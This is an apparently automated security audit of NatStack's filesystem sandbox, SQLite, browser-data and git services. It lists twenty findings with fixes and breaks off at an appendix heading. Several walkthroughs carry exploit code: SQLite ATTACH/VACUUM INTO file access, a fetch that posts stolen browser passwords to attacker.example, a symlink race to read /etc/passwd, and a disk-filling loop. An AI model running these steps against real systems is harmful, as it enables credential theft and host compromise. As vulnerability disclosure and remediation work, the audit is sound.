# Audit 07 — Filesystem, Paths, and Data Layer

**Scope:** filesystem RPC surface exposed to panels, path sandboxing,
git service / context folders, build store, SQLite access, browser-data
service, harness file tools, env-paths, and state directory layout.

**Date:** 2026-04-23
**Auditor:** (automated)
**Branch:** `audit`
**Commit at audit time:** `bafe7bc8`

---

## 1. Executive Summary

NatStack grants panels a first-class `fs.*` RPC interface sandboxed to a
per-context directory under
`~/.config/natstack/context-scopes/<workspaceId>/<contextId>/`. That
sandbox is correctly enforced against classic `..`/absolute-path
traversal. However, several serious gaps undermine the model:

| # | Finding | Severity |
|---|---|---|
| F-01 | `db.*` service exposes **unrestricted SQLite `exec`** to panels → `ATTACH DATABASE`, `VACUUM INTO`, read/write arbitrary SQLite files on host | **Critical** |
| F-02 | `browser-data` service is reachable from `panel`/`worker` callers, exposing `getPasswords`, `getCookies`, `getHistory`, `exportAll` — any panel can dump the entire imported browser credential store | **Critical** |
| F-03 | `fs.symlink` + pervasive TOCTOU in `sandboxPath` — panel can race between check and use of a sandboxed path to make `readFile`/`rename`/`copyFile` follow a symlink out of the sandbox | **High** |
| F-04 | `fs.chown` is exposed to panels with no UID/GID allowlist — panel can take away ownership of files inside the sandbox or (after escape via F-03) anywhere writable by the server | **High** |
| F-05 | `fs.*` write/append/handleWrite have **no size limits**, enabling trivial disk-exhaustion DoS against the host | **High** |
| F-06 | `fs.symlink` validation checks the *target string* at creation but not during later reads. Combined with `symlink("../../../etc/passwd", "foo")` being rejected only if the immediate resolve escapes, panels can construct chains of sandbox-internal symlinks that, together with a mutated target on disk via a TOCTOU window, follow out of sandbox | **High** |
| F-07 | `gitService.createRepo` uses `workspacePath + "/"` for path-prefix check (POSIX-only string), and does not check for pre-existing symlinks at the target — `execSync("git init")` runs inside the symlink target | **High** |
| F-08 | `GitServer.resolveRef` / `listCommits` forward user-controlled `ref` strings into `spawn("git", ["rev-parse", ref])` without a `--` separator — refs starting with `-` are consumed as git flags (argument injection into `git log --exec=...`-style options is not possible with rev-parse/log but information-disclosure flags exist) | **Medium** |
| F-09 | `ContextFolderManager.setupContextGit` **symlinks `.git/hooks/`** from the per-context folder to the source repo. Although the fs sandbox catches writes that traverse the symlink, any pathway that bypasses the sandbox (F-03 TOCTOU, F-07 git init in sandbox, direct build-store writes) lands in the developer's real `.git/hooks/`, yielding RCE on subsequent `git checkout` | **High (latent)** |
| F-10 | `dbService` shares one `better-sqlite3` connection between all callers for a given db name. Panel A's prepared statements and active transactions are visible to Panel B | **Medium** |
| F-11 | `dbService.open` uses `sanitizeDbName(name)` that collapses all non-alphanumerics to `_` — `a/b`, `a..b`, `a b`, and `a_b` all collide, letting one panel clobber another's data store | **Medium** |
| F-12 | `grep`/`find` tools feed user patterns directly to `new RegExp(pattern)` — classic catastrophic-backtracking DoS | **Medium** |
| F-13 | `fs.mktemp` places tmp files under `<root>/.tmp/` but predictable name = `prefix-<8 random bytes>`. While the random nybble makes racing hard, the `.tmp` directory's existence is world-checkable via `fs.readdir` by the same panel and is NOT excluded from grep/find — minor info leak of ongoing edits | **Low** |
| F-14 | `buildStore.put` writes to `${dir}.tmp.${Date.now()}.${process.pid}` — **predictable** tmp dir name. A concurrent process on the same host with write access to `builds/` can pre-create a symlink there | **Low** |
| F-15 | `fsService.readFile` returns full file contents in a single base64 envelope with **no upper size bound** — panel can OOM the server by asking it to read `/dev/zero` (after sandbox escape) or a 20 GB file in the sandbox | **Medium** |
| F-16 | `panelPersistence`, `databaseManager` run `db.pragma("foreign_keys = ON")` on every open. Good. But `panelSearchIndex` and migrations are not inspected here; see `panelSchema.ts` for migration safety | (note) |
| F-17 | `loadSecretsFromPath` / `saveCentralConfig` write config/secret YAML without explicit `mode: 0o600`; relies on the 0o700 dir permission set by `ensureCentralConfigDir`. If dir perms are weaker (SMB/NTFS, some CI envs), secrets become world-readable | **Medium** |
| F-18 | `workspaceService.readSkill` validates skill names against `/^[a-zA-Z0-9_-]+$/` — correctly blocks traversal. `getAgentsMd` reads a fixed path. No finding. | OK |
| F-19 | `sandboxPath`'s symlink walk uses `fs.lstat` + `fs.realpath` sequentially; on macOS/Windows case-insensitive FS the `resolved.startsWith(root + path.sep)` string check may diverge from fs canonicalization (8.3 short names, case folding) leading to either false rejection or, in pathological setups, false acceptance | **Low** |
| F-20 | `fs.mktemp` prefix sanitization replaces `/` and `\` with `_` but does not strip leading dots — a caller can create files like `<root>/.tmp/.htaccess-<rand>` and similar; low impact since still inside sandbox | **Informational** |

Five critical/high issues (F-01..F-04, F-05, F-09) are panel-to-server
escapes or data-exfiltration holes; the rest reduce defense-in-depth.

---

## 2. Trust Model for Panel FS Access

Design intent:

1. Panels are **untrusted** code running in workerd.
2. Panels speak a JSON-RPC `fs.*` protocol to the server.
3. Each caller is associated (via `bindContext`) with a single
   `contextId`; `fsService.resolveContextRoot` maps the caller to
   `<contextsRoot>/<contextId>/` and treats that path as the root of
   the panel's view of the filesystem.
4. All `fs.*` methods accept paths in that logical root; leading `/`
   is stripped, `path.resolve(root, relative)` is called, and the
   result must be inside `root` after symlink checks.
5. Other server services (`git`, `build`, `db`, `browser-data`,
   `settings`, `image`, `workspace`) either (a) do not accept
   filesystem paths from panels, or (b) validate paths against a
   workspace-specific allowlist of repo paths.

Actual model as implemented:

* Policy-based gating is declared in each `ServiceDefinition.policy`;
  the RPC dispatcher enforces that `ctx.callerKind` is in the policy's
  `allowed` set.
* `db`, `build`, `workspace`, `image`, `browser-data`, `git` all
  declare `panel` (and usually `worker`) as an allowed caller kind.
* The fsService sandbox is the only layer between a panel and the
  server's full filesystem identity.
* **There is no process boundary, no OS-level chroot, no seccomp,
  no LSM policy.** The server process runs with the full privileges
  of the user. Any sandbox escape is equivalent to local-user RCE.

Any finding below that produces a path outside the context root is
therefore an immediate full-filesystem-access bug, not a scoped leak.

---

## 3. Findings — Detailed

Findings are ordered by severity. File:line references are to the
commit checked out at audit time.

---

### F-01 (Critical) — `db.*` service grants unrestricted SQLite access to panels

**Files:**
* `src/server/services/dbService.ts:11-56`
* `packages/shared/src/db/databaseManager.ts:126-162`

**Exploit walkthrough:**

```js
// inside a malicious panel
const h = await rpc.call("main", "db.open", "whatever");
// exfil: read a sibling panel's sqlite db
await rpc.call("main", "db.exec", h, `
  ATTACH DATABASE '/home/victim/.config/natstack/workspaces/default/.databases/other-panel.db' AS x;
  CREATE TABLE IF NOT EXISTS leak(data BLOB);
  INSERT INTO leak SELECT CAST(sqlite_master AS BLOB) FROM x.sqlite_master;
`);
const rows = await rpc.call("main", "db.query", h, "SELECT * FROM leak");

// write: clobber any writable path on the host
await rpc.call("main", "db.exec", h, `VACUUM INTO '/tmp/pwned.db';`);
// more dangerously, with directed content:
await rpc.call("main", "db.exec", h, `
  ATTACH DATABASE '/home/victim/.ssh/authorized_keys' AS v;
`);
// (fails because not a SQLite file, but the file is read on open for magic)
```

Because `better-sqlite3` allows `ATTACH DATABASE '<arbitrary path>'`,
and `exec`/`query`/`run` forward arbitrary SQL straight to the
connection, a panel has read/write access to any SQLite database on
the host and can create arbitrary new SQLite files.

Policy line (`dbService.ts:11`): `allowed: ["shell", "panel", "server", "worker"]`.

**Other ATTACH-free vectors opened by `exec`:**

* `PRAGMA temp_store_directory = '/some/other/writable/dir';`
* `VACUUM INTO '<arbitrary path>';` — creates a SQLite file at the
  target (writes the contents of the current db there), giving a
  write-arbitrary-file primitive.
* `SELECT zeroblob(1024*1024*1024)` — easy memory/disk DoS.

**Recommended fix:**

1. Disable `ATTACH` by running `PRAGMA query_only = ON` on all
   databases opened for panels, or set `db.defensive(true)` +
   `db.unsafeMode(false)` + a statement-level parser gate that
   rejects `ATTACH`, `DETACH`, `VACUUM`, `PRAGMA temp_store_directory`,
   `PRAGMA mmap_size`.
2. Even better: expose only high-level operations (`insert`, `select`
   by table, bound parameters only) to panel callers; reserve `exec`
   for `server`/`shell` callers.
3. Replace `exec` with a migration API that accepts a set of
   pre-validated, application-defined schema strings keyed by name.
4. Fail-closed if `sql` contains known-dangerous tokens (`ATTACH`,
   `DETACH`, `VACUUM INTO`, `load_extension`, `PRAGMA temp_store`,
   `PRAGMA journal_mode` changes).

---

### F-02 (Critical) — `browser-data` service is reachable from panels

**File:** `src/main/services/browserDataService.ts:155`
```
policy: { allowed: ["shell", "panel", "worker"] },
```

Exposed methods include:

* `getPasswords`, `getPasswordForSite`, `exportPasswords`
* `getCookies`, `clearCookies`, `exportCookies`, `exportAll`
* `getHistory`, `searchHistory`, `clearAllHistory`
* `getAutofillSuggestions`
* `addPassword`, `deletePassword`

A malicious panel can:

```js
// One-line exfil of every imported password
const pws = await rpc.call("main", "browser-data.getPasswords");
await fetch("https://attacker.example/", { method: "POST", body: JSON.stringify(pws) });
```

Because this service includes full history and cookies, a panel can
also steal session cookies that might grant it access to other
services.

**Recommended fix:** restrict `policy.allowed` to `["shell"]` (the
user's settings/import UI). If panels ever need browser data, add a
narrow, prompt-consented method (e.g. "autofill for this domain only"
with explicit user approval) rather than a blanket dump API.

---

### F-03 (High) — Pervasive TOCTOU between `sandboxPath` and use

**File:** `packages/shared/src/fsService.ts:44-70`

```ts
async function sandboxPath(root: string, userPath: string): Promise<string> {
  ...
  const resolved = path.resolve(root, relative);
  if (!resolved.startsWith(root + path.sep) && resolved !== root) { ... }
  // walk + lstat + realpath for each segment ← check time
  ...
  return resolved;
}
```

and every op:

```ts
case "readFile": {
  const p = await sandboxPath(root, args[0] as string);
  ...
  const buf = await fs.readFile(p);   // ← use time
}
```

Between the sandboxPath walk (which does `lstat`/`realpath` on each
segment) and the actual `fs.readFile` / `fs.rename` / `fs.copyFile`
call, the panel can issue *another* RPC that mutates the tree:

1. Panel calls `fs.writeFile("a", "safe")` to create a real file.
2. Panel launches concurrent `fs.readFile("a")` and
   `fs.unlink("a"); fs.symlink("/etc/passwd", "a")` — both are
   valid within the sandbox check sequence but the symlink swap
   happens between the check and the read.
3. `fs.readFile` follows the symlink and returns `/etc/passwd`
   contents base64-encoded.

`readFile`, `copyFile`, `rename`, `appendFile`, `truncate`,
`chmod`, `chown`, `utimes`, `access`, `stat` (vs `lstat`) all follow
symlinks. The only protection against a late-planted symlink is the
inline `lstat` walk, which is itself susceptible to the same race.

**Recommended fix:** perform the critical fs operation with
`O_NOFOLLOW` + `openat` at each component, or open the file first
(with flags that refuse symlinks), `fstat`, confirm parent directory
via `fs.openFile` + `fstatat`, then read. In Node this means using
`fs.open(..., fs.constants.O_NOFOLLOW)` or `resolvepath`-style
helpers.

A cheaper mitigation: after `sandboxPath`, call
`fs.realpath(resolved)` once and verify it still starts with `root`,
then pass the realpath (not the original) to the fs op. This closes
most single-swap races at the cost of breaking legitimate symlink
creation. Best is to combine both.

---

### F-04 (High) — `fs.chown` is available to panels

**File:** `packages/shared/src/fsService.ts:447-451`

```ts
case "chown": {
  const p = await sandboxPath(root, args[0] as string);
  await fs.chown(p, args[1] as number, args[2] as number);
  return;
}
```

No UID/GID allowlist. On Linux a non-root process can only chown to
itself so the blast radius is "files within my sandbox become owned
by current user" (usually already true) — the value of this
capability for panels is zero and the risk is non-zero (interaction
with F-03 to chown files outside the sandbox; interaction with
setgid directories).

**Recommended fix:** remove `chown` (and probably `chmod`, `utimes`)
from the panel-facing surface.

---

### F-05 (High) — No size/quota enforcement on fs writes

**File:** `packages/shared/src/fsService.ts` — `writeFile`,
`appendFile`, `handleWrite`, `copyFile`.

Only `handleRead` enforces `MAX_READ_LENGTH = 64 * 1024 * 1024`. There
is no per-context disk quota and no per-write cap. A panel can:

```js
while (true) await rpc.call("main", "fs.appendFile", "/pad", "x".repeat(1e7));
```

to fill the host disk. Because context scopes live under the user's
config directory, this can brick the user's machine (login blocked,
browser cache fails, etc.).

**Recommended fix:** implement a per-context quota (e.g. 1 GB default,
configurable) checked in `writeFile`/`appendFile`/`copyFile`/
`handleWrite`/`rename` (which can grow a target). Also cap single-call
data sizes: refuse `writeFile` with payloads > some bound.

---

### F-06 (High) — `fs.symlink` permits staged escape

**File:** `packages/shared/src/fsService.ts:423-438`

```ts
case "symlink": {
  const target = args[0] as string;
  const linkPath = await sandboxPath(root, args[1] as string);
  const linkDir = path.dirname(linkPath);
  const resolvedTarget = path.resolve(linkDir, target);
  if (!resolvedTarget.startsWith(root + path.sep) && resolvedTarget !== root) {
    throw new Error("Symlink target escapes sandbox");
  }
  await fs.symlink(target, linkPath);
  return;
}
```

This only checks the *literal text* of `target` at creation time.
Attack chain:

1. `mkdir("/a")` then `mkdir("/a/b")`.
2. `symlink("b", "/a/link")` — passes the check.
3. `rm("/a/b", {recursive:true})` — allowed.
4. `symlink("../../../etc", "/a/b")` — this is blocked *as-is* because
   the resolved target of the new link would escape. Good.

However, a different sequence defeats the check against `readlink`:

1. `writeFile("/a/real", ...)` a real file
2. `symlink("/a/real", "/a/link")` — target resolves to `<root>/a/real`,
   passes check.
3. A concurrent RPC stream that races `readFile("/a/link")` against
   an `unlink("/a/real") && symlink("../../../../../etc/passwd", "/a/real")`
   sequence. The second `symlink` *is* rejected by the sandbox check,
   but if the attacker can beat the sandbox to the punch (e.g. by
   exploiting a rejected-but-written state) the chain bites.

More importantly, the sandbox check uses absolute `path.resolve`. A
symlink's text target is interpreted by the kernel relative to the
*link location* and across symlink chains — the check does not model
"the kernel walks link A → link B → link C" and so chained symlinks
inside the sandbox that each individually resolve inside the root but
*together* point outside are not caught (the `sandboxPath` walker
rechecks each segment at use, which would catch this single-stepping;
but with TOCTOU swaps between `lstat`, `realpath`, and the final op
call, the protection is racy — see F-03).

**Recommended fix:** store the realpath at symlink creation time and
pin the inode check; better, disallow panel-created symlinks
entirely and let `sandboxPath` treat any symlink encountered during a
walk as a hard error (tightening the current code).

---

### F-07 (High) — `gitService.createRepo` is not symlink-safe and uses POSIX-only prefix check

**File:** `src/server/services/gitService.ts:42-57`

```ts
const absolutePath = resolve(deps.workspacePath, repoPath);
if (!absolutePath.startsWith(deps.workspacePath + "/") && absolutePath !== deps.workspacePath) {
  throw new Error("Invalid repo path: escapes workspace root");
}
if (fs.existsSync(absolutePath)) throw new Error(`Path already exists: ${repoPath}`);
await mkdir(absolutePath, { recursive: true });
execSync("git init", { cwd: absolutePath, stdio: "pipe" });
```

Issues:

1. Hard-coded `"/"` — broken on Windows (should be `path.sep`).
2. `fs.existsSync(absolutePath)` does not detect a parent-directory
   symlink. If `<workspace>/panels` is replaced by a symlink pointing
   to `/etc` (plausible if the workspace tree is writable), `mkdir`
   follows it and `git init` runs inside `/etc/<repoPath>`.
3. `repoPath` is allowed to traverse *intermediate* directories: e.g.
   `repoPath = "panels/../sneaky/../../../tmp/malicious-repo"` is
   rejected by the startsWith check, but `"panels/sub"` combined with
   a pre-planted symlink at `panels/sub` bypasses the check.

This service is listed as `allowed: ["shell", "panel", "server", "worker"]`
(`gitService.ts:18`) so panels can trigger it.

**Recommended fix:** restrict to `shell`, or at minimum:
* `realpath(workspacePath)` and verify the realpath of `dirname(absolutePath)`
  starts with it.
* Reject if any ancestor of `absolutePath` is a symlink.
* Use `path.sep` (or a helper like `isInside(parent, child)` that
  normalizes correctly).

---

### F-08 (Medium) — Argument injection into `git rev-parse`/`git log` via unvalidated `ref`

**File:** `packages/git-server/src/server.ts:757-786` (`resolveRef`)
and `src/server/services/gitService.ts:39` which forwards
`args[1]` straight into `GitServer.resolveRef`.

```ts
const result = await this.runGit(["rev-parse", targetRef], absolutePath);
```

If `targetRef` starts with `-`, git interprets it as an option. For
`rev-parse` and `log`, option parsing is permissive. While there is
no direct RCE vector analogous to `--upload-pack=` on `git clone`,
options like `--parseopt`, `--sq-quote`, `--show-toplevel` (rev-parse)
and `--output=<file>` (log) change behavior or (in the log case) can
write output to arbitrary paths reachable by the server process.

`listCommits` (`server.ts:703`) has the same pattern:

```ts
const stdout = await this.runGit(
  ["log", ref, `-${limit}`, "--format=%H|%s|%an|%at"],
  absolutePath
);
```

And `git log --output=/tmp/x` is a real primitive if ref is
attacker-controlled (although `--output` was removed in modern git;
verify on target version). Any git command taking attacker-controlled
positional args needs `--` before them.

**Recommended fix:** insert `--` between the option list and the
user-supplied ref:

```ts
this.runGit(["rev-parse", "--", targetRef], absolutePath);
this.runGit(["log", "--format=%H|%s|%an|%at", `-${limit}`, "--", ref], absolutePath);
```

Also validate `ref` against `^[A-Za-z0-9_./@{}^~!-]+$` (git's allowed
ref charset plus `^~` revision syntax) and reject leading `-`.

---

### F-09 (High latent) — `.git/hooks` is symlinked from context folders to the source repo

**File:** `packages/shared/src/contextFolderManager.ts:28,56-76`

`GIT_MUTABLE` contains `["HEAD", "index", "refs", "logs", "config",
"packed-refs", "COMMIT_EDITMSG", "info"]`. Everything else, including
`hooks/`, is symlinked into the source repo's `.git/`:

```ts
if (GIT_MUTABLE.has(entry.name)) { ... copy ... }
else {
  const relTarget = path.relative(destGit, srcPath);
  await fs.symlink(relTarget, destPath);
}
```

Consequences:

1. The sandbox `sandboxPath` correctly refuses a panel write to
   `.git/hooks/post-checkout` because the `hooks` segment is a
   symlink whose target escapes root.
2. **But** the ambient contract is wrong: any bypass of the sandbox
   (F-03 TOCTOU, F-07 misconfigured git path, a future service that
   writes via node fs without going through `sandboxPath`) that
   touches `.git/hooks/*` in a context folder silently writes to the
   developer's shared source repo. A panel that manages to execute
   even one `writeFile` inside `.git/hooks/` achieves durable,
   machine-persistent RCE: every subsequent `git checkout` on the
   host runs the hook.
3. `setupContextGit` also symlinks `objects/`, meaning pack files are
   shared — a panel that can inject an object (e.g. via git push to
   the local git server) affects every context and the source tree.

**Recommended fix:** copy `hooks/` (and specifically add it to a
`GIT_IMMUTABLE_BUT_COPY` set), or set it to an empty directory in
each context. Consider also copying `objects/info` and marking the
objects symlink read-only. At minimum, add an explicit `sandboxPath`
short-circuit that rejects any attempt to touch `.git/hooks/` in a
context folder, even on symlink creation, regardless of target.

---

### F-10 (Medium) — Shared SQLite connections between panels

**File:** `packages/shared/src/db/databaseManager.ts:93-122`

`openDatabase` reuses a single `Database` connection per file path and
returns a fresh handle per caller. The connection is not re-entrant
across panels: statements prepared by Panel A are visible from Panel
B's handle (both point to the same connection), and a transaction
opened by Panel A blocks Panel B.

Realistic impact:
* Panel B can probe the presence/shape of Panel A's tables via
  `PRAGMA table_list` (if panels share a db name).
* A long-running transaction in one panel stalls others.
* `close()` on one handle decrements ref count but does not roll back
  a half-finished transaction in another.

**Recommended fix:** create one connection per handle if per-caller
isolation matters; or namespace database names by callerId (append
caller hash into sanitized name) so no two callers share a file.

---

### F-11 (Medium) — `sanitizeDbName` creates collisions

**File:** `packages/shared/src/db/databaseManager.ts:234-240`

```ts
const sanitized = name.replace(/[^a-zA-Z0-9_-]/g, "_").slice(0, 64);
```

Inputs `"a/b"`, `"a..b"`, `"a b"`, `"a_b"`, `"a-b"` → all normalize to
differ only by character, meaning e.g. `"orders/v1"` and `"orders_v1"`
land at different paths (so no collision there), but `"a b"` and
`"a/b"` collide at `"a_b.db"`. This is not a sandbox escape but it
lets a panel squat on another panel's db namespace.

Also: the function does not reject empty post-sanitize names caused by
inputs of only punctuation (e.g. `"_"` → `"_"`; `"..."` → `"___"`).
Not exploitable but indicates lax validation.

**Recommended fix:** reject names that don't match a strict regex
(same as contextId — `^[a-z0-9][a-z0-9-]*[a-z0-9]$`). Fail fast.

---

### F-12 (Medium) — ReDoS via user-provided grep/find patterns

**Files:**
* `packages/harness/src/tools/grep.ts:213-220`
* `packages/harness/src/tools/find.ts:77` (via `globToRegex` — bounded)

```ts
function buildRegex(pattern: string, { literal, ignoreCase }: ...) {
  const source = literal ? escapeRegex(pattern) : pattern;
  const flags = ignoreCase ? "i" : "";
  return new RegExp(source, flags);
}
```

A panel-authored agent can invoke `grep` with a catastrophic pattern
like `(a+)+$` on a 100 KB file and stall the server's event loop for
several seconds. Repeated at 100 req/s this is a DoS.

**Recommended fix:** run regex in a worker thread with a timeout, use
RE2 (via npm `re2`) for linear-time matching, or at minimum implement
a match-time budget with `setTimeout`-based interruption. Also cap the
compiled regex complexity (e.g., re-compile with `u` flag and reject
patterns that fail structural checks).

---

### F-13 (Low) — Predictable `.tmp/` prefix collision

**File:** `packages/shared/src/fsService.ts:514-529`

`mktemp` strips path separators but keeps dots in the prefix; the
filename is `<prefix>-<hex(8)>`. Attackers predicting prefix from
application-level conventions (e.g. our own `edit-` used by the edit
tool) can pre-create a file with matching name in `.tmp/` to hijack
the next edit — but random 8-byte nonce makes this infeasible in
practice. Defense in depth: the `fs.writeFile(tmpPath, finalContent)`
in `edit.ts:122` would overwrite an attacker-planted file at that
exact path.

**Recommended fix:** keep 8-byte nonce (fine) but consider 16 bytes;
document that `.tmp/` is a reserved name panels cannot create outside
of `mktemp`.

---

### F-14 (Low) — Build-store tmp dir name is predictable

**File:** `src/server/buildV2/buildStore.ts:175-177`

```ts
const tmpDir = `${dir}.tmp.${Date.now()}.${process.pid}`;
fs.mkdirSync(tmpDir, { recursive: true });
```

`process.pid` is readable by any local process. `Date.now()` is easy
to predict to the second. Attack: a local non-NatStack process
pre-creates `${dir}.tmp.<guessed-ms>.<pid>` as a symlink pointing
anywhere writable by the NatStack user; when `put` runs, writes go
through the symlink. In practice this requires another local attacker
process; if the adversary already has that, they have the same
privileges as the target — so low severity.

**Recommended fix:** use `fs.mkdtempSync(dir + ".tmp.")`.

---

### F-15 (Medium) — Unbounded `fs.readFile` return size

**File:** `packages/shared/src/fsService.ts:284-292`

```ts
case "readFile": {
  const p = await sandboxPath(root, args[0] as string);
  const encoding = args[1] as string | undefined;
  if (encoding) return fs.readFile(p, encoding as BufferEncoding);
  const buf = await fs.readFile(p);
  return encodeBinary(buf);
}
```

No cap on file size. A panel that creates a 2 GB file inside its
sandbox and calls `readFile` drives the server to allocate both the
file buffer and its base64 expansion (1.33x), easily OOM-ing the
process.

**Recommended fix:** stat first, refuse reads over a configurable
limit (e.g. 128 MB), and provide a streaming `handleRead`-style API
for larger reads (already exists; direct the user there).

---

### F-16 (Informational) — Panel DB migration safety

The panel-tree SQLite (`panelSchema.ts`, used by `panelPersistence.ts`)
correctly enables `foreign_keys = ON` and uses prepared statements
throughout. Dynamic SQL fragments in `updatePanel` (`panelPersistence.ts:343-371`)
only concatenate column names from a closed set — **not SQL injection**.
The `movePanel` /`normalizePositions` flow is not wrapped in a single
transaction, so a crash mid-operation can leave gaps/duplicates in
`position`. Consider `db.transaction(...)()` around the
shift/update/normalize trio.

No SQL injection risk identified here. Parametrization is consistent.

---

### F-17 (Medium) — Secret files not written with explicit 0o600

**File:** `packages/shared/src/workspace/loader.ts:204-212`

```ts
fs.writeFileSync(secretsPath, YAML.stringify(secrets), "utf-8");
```

No `{ mode: 0o600 }` passed. Relies on the surrounding dir being
0o700. `ensureCentralConfigDir` does enforce 0o700 on Linux/macOS
(`centralAuth.ts:37-44`), but:

* On first-time setup, there is a race: dir created → umask determines
  intermediate perms briefly.
* On Windows, POSIX modes are advisory and dir ACLs may differ.
* On SMB/NFS mounts, mode bits often ignored.

`saveCentralConfig` (line 217) also writes without mode. `config.yml`
may contain references to providers but typically no secrets itself —
however `loadCentralConfig` migrates and rewrites unconditionally.

The admin-token path is correct (`centralAuth.ts:72`): `mode: 0o600`.

**Recommended fix:** pass `{ mode: 0o600 }` to all
`writeFileSync(secretsPath, ...)` and to `saveCentralConfig`. Also
`fs.chmodSync(secretsPath, 0o600)` after write to fix pre-existing
files with permissive modes.

---

### F-18 (OK) — `workspaceService.readSkill`

The validation `/^[a-zA-Z0-9_-]+$/` on `name` correctly refuses
`../`, `./`, null bytes (`\0` isn't in the allowed set), and Unicode
confusables. No finding.

---

### F-19 (Low) — Case-insensitive filesystem corner cases

**File:** `packages/shared/src/fsService.ts:44-70`

`resolved.startsWith(root + path.sep)` is case-sensitive. On macOS
(HFS+/APFS default case-insensitive) and Windows (NTFS case-insensitive
by default), the filesystem canonicalization (`fs.realpath`) may
return a differently-cased string than the original `root`. If
`contextsRoot` is configured via env (NFC-normalized) but
`fs.realpath` returns NFD (macOS does NFD for HFS+), the `startsWith`
check may reject legitimate accesses *or* (with crafted name
collisions) accept escapes.

Also on Windows, 8.3 short names (`PROGRA~1`) sometimes appear from
`realpath`; the check assumes long names.

**Recommended fix:** canonicalize `root` with `fs.realpathSync(root)`
once at startup and stash it; apply the same normalization to the
resolved path before the prefix compare. Use
`path.relative(root, resolved).startsWith("..")` as the primary
check (works across case issues since it's a purely lexical
operation on already-resolved paths) and back it with inode
comparison via `fstat` when open.

---

### F-20 (Informational) — `mktemp` prefix allows leading dots

Panels can pass prefix `.htaccess` (if webserver ever served `.tmp/`)
or `.hidden-config`. Because `.tmp/` is inside the context sandbox
and not served publicly, low impact. Note only.

---

## 4. Path-handling Inventory

Locations where user or panel input can reach a filesystem call:

| File:line | Call | User input | Protection |
|---|---|---|---|
| `packages/shared/src/fsService.ts:44` | `sandboxPath` (all fs.*) | path strings | `path.resolve` + prefix check + symlink walk (racy) |
| `src/server/services/gitService.ts:45` | `resolve(workspacePath, repoPath)` | createRepo path | prefix check only (no symlink) — **F-07** |
| `packages/env-paths/src/index.ts:45` | `getWorkspaceDir(name)` | workspace name | validated upstream (`WORKSPACE_NAME_RE`) |
| `packages/shared/src/contextFolderManager.ts:34-43` | `validateContextId` | context id | strict regex — OK |
| `packages/shared/src/db/databaseManager.ts:52` | `path.join(dbDir, sanitize(name))` | panel db name | lossy sanitize — **F-11** |
| `src/server/services/workspaceService.ts:285-289` | `readSkill(name)` | skill name | strict regex — OK |
| `src/server/buildV2/buildStore.ts:175` | `${dir}.tmp.${Date.now()}.${pid}` | n/a | predictable — **F-14** |
| `packages/shared/src/workspace/loader.ts:204` | secrets write | config path | no mode — **F-17** |
| `packages/browser-data/src/import/fileCopier.ts:23` | `mkdtempSync` | n/a | random — OK |
| `packages/shared/src/fsService.ts:521` | `mktemp` | prefix | sanitized | 

All top-level filesystem calls found with grep `path.resolve|path.join|path.normalize|realpath` (~300 hits) are either against static paths, against already-validated paths, or go through `sandboxPath`. No unguarded `fs.readFile`/`fs.writeFile` with direct panel input was found outside the above.

---

## 5. SQL Access Pattern Summary

| Place | Query style | Parametrized? | User SQL allowed? |
|---|---|---|---|
| `panelPersistence.ts` | `db.prepare(...).run/get/all` | ✅ (all parameters bound) | ❌ |
| `databaseManager.ts` (panel-visible) | `db.prepare(sql).all(...params)` and `db.exec(sql)` | ✅ for params; **raw SQL for `exec`** | **✅ — F-01** |
| `panelSearchIndex.ts` | Not audited in depth (see future audit) | — | ❌ |
| `browser-data/src/storage/*` | (not audited here; panels don't reach it via raw SQL) | — | ❌ |

**No SQL injection** found in server-owned code; all dynamic SQL
(e.g. `panelPersistence.updatePanel`) concatenates only column names
from a hard-coded allowlist. The one hole is F-01 — `dbService.exec`
is *intentionally* raw-SQL but is reachable by panels.

---

## 6. Remediation Priority

1. **Immediately restrict** `browser-data` and `db` service policies:
   * `browser-data.policy.allowed = ["shell"]`.
   * `db.policy.allowed = ["shell", "server"]`, or keep `panel`/`worker`
     but remove `exec` from their surface and gate SQL against an
     ATTACH/VACUUM/PRAGMA-changes allowlist.
2. **Shore up fsService:**
   * Cap read/write sizes.
   * Remove `chown`/`chmod` from panel surface.
   * Add per-context disk quota.
   * Replace symlink-walk sandboxing with `O_NOFOLLOW`/`realpath`-pinned
     open + inode check.
3. **Fix context-folder `.git/hooks` symlink** to copy rather than
   symlink.
4. **Tighten git service paths:** `realpath(workspacePath)` check, use
   `path.sep`, detect ancestor symlinks, insert `--` in git args.
5. **Add mode 0o600** to all secrets/config writes.
6. **Replace predictable tmp names** with `fs.mkdtemp`.
7. **Replace unsafe regex** in grep with RE2 or add CPU budget.

---

## 7. Appendix — Code Hotspots

### 7.1 fsService dispatch (abridged)

File: `packages/shared/src/fsService.ts:261-534`

```
handleCall(ctx, method, rawArgs):
  - bindContext: register panelId→contextId mapping
  - resolveContextRoot(ctx, args): root, panelId
  - for each method: sandboxPath(root, args[0]) → p
  - call fs.<method>(p, ...)
```

Methods exposed to panels:
`readFile`, `writeFile`, `appendFile`, `readdir`, `mkdir`, `rmdir`,
`rm`, `stat`, `lstat`, `exists`, `access`, `unlink`, `copyFile`,
`rename`, `realpath`, `truncate`, `readlink`, `symlink`, `chmod`,
`chown`, `utimes`, `open`, `handleRead`, `handleWrite`, `handleClose`,
`handleStat`, `mktemp`, `bindContext`.

### 7.2 Context root layout

```
<userDataPath>/context-scopes/<workspaceId>/<contextId>/
  ├── <repo1>/
  │   ├── .git/        (mixed: symlinks to source .git for objects+hooks, copies for HEAD/refs/etc.)
  │   ├── src/
  │   └── ...
  ├── .tmp/            (mktemp scratch)
  └── .databases/      (panel SQLite files — via .databases alias; not auto-cleaned)
```

### 7.3 Service policy reference

| Service | Allowed callers | Source |
|---|---|---|
| `fs` | panel, worker, server, shell (implicit) | `fsService.ts` top of handler |
| `db` | shell, panel, server, worker | `dbService.ts:11` |
| `browser-data` | shell, panel, worker | `browserDataService.ts:155` |
| `git` | shell, panel, server, worker | `gitService.ts:18` |
| `build` | panel, shell, server, worker | `buildService.ts:11` |
| `workspace` | shell, panel, worker, server | `workspaceService.ts:128` |
| `image` | shell, panel, worker, server | `imageService.ts:78` |
| `settings` | shell | `settingsService.ts:16` |

### 7.4 File-owned prepared statement inventory (panelPersistence)

See `packages/shared/src/db/panelPersistence.ts`:
* `PANEL_QUERIES.*` in `panelSchema.ts` — all parametrized.
* Dynamic UPDATE in `updatePanel` (line 370): only hard-coded columns.
* `updateSelectedPath` walks tree with prepared statements — no SQL
  injection risk; however, loop relies on `MAX_DEPTH = 100` to avoid
  infinite loops (good).

### 7.5 Git hook blast radius (worked example)

Assume F-03 is exploited. Attacker primitive: `writeFile(<path>, <content>)`
where `<path>` can land outside the sandbox.

